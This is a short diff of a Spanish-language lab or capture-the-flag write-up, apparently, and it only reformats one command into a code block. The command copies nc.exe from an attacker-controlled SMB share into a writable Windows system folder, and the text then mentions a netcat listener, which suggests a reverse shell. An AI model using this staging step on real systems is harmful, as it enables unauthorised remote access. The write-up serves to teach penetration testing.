@@ -125,7 +125,9 @@ Se nos creará un `doc.chm`, lo vamos a pasar a nustra máquina de atacante y de
 
 Bien, también nos copiaremos el `NC`, aunque en la carpeta que hayamos especificado antes:
 
-- `copy \\10.10.14.15\share\nc.exe \windows\system32\spool\drivers\color\`
+```
+copy \\10.10.14.15\share\nc.exe \windows\system32\spool\drivers\color\
+```
 
 Bien! Ya estamos listos, nos ponemos en escucha con `NC` por el puerto especificado anteriormente:
 
